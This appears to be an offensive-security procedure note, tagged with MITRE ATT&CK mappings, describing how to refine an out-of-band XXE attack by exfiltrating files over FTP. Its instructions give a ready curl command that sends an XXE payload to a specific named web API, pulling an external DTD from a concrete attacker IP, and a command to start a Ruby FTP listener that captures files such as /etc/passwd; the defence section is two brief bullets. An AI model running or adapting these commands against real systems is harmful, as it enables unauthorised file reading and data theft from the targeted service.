---
tags:
  - xxe
  - oob
  - ftp-exfiltration
type: procedure
tools:
  - '[[tools/ftp-rb]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/run-ruby-ftp-server]]'
platforms:
  - Web
  - Linux
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 60572ac9-d6da-4a4a-8f3a-caad5586791c
created_at: '2025-12-13T09:00:27.532Z'
updated_at: '2025-12-13T09:00:27.532Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Refine OOB XXE with FTP Exfiltration

## Summary

This procedure refines the OOB XXE attack by using an external XML file and FTP protocol for exfiltrating sensitive data.

## Description

The payload references an external DTD that defines entities to send file contents via FTP to an attacker-controlled server. A Ruby script runs the FTP server to capture the data. This method is effective for blind XXE where HTTP exfiltration fails.

## Requirements

1. Attacker-controlled FTP server
2. External hosting for the DTD file
3. Confirmed OOB capability

## Defense

Defensive measures and detection strategies:

- Restrict outbound FTP traffic
- Scan for anomalous DTD references in XML

## Objectives

1. Achieve reliable data exfiltration
2. Capture sensitive files like /etc/passwd
3. Validate full exploitation

## Instructions

### Step 1: Start FTP Server

**Context**: Run the Ruby script to listen for incoming FTP connections.

**Command** ([[commands/run-ruby-ftp-server]]):
```bash
ruby ftp.rb
```

> The script starts an FTP server at 95.213.191.87 to receive exfiltrated data.

### Step 2: Send Refined XXE Payload

**Context**: Inject payload referencing external DTD for FTP exfiltration.

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://95.213.191.87/aa.xml"> %remote; %param1; %send; ]><query>search</query>' https://marketplace.informatica.com/api/rest/mpapi/infaMPAPISearchWebService/query
```

> The external aa.xml defines entities to send file content via FTP.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/run-ruby-ftp-server]]

## Tools Used

- [[tools/ftp-rb]]

## Tags

- [[xxe]]
- [[oob]]
- [[ftp-exfiltration]]
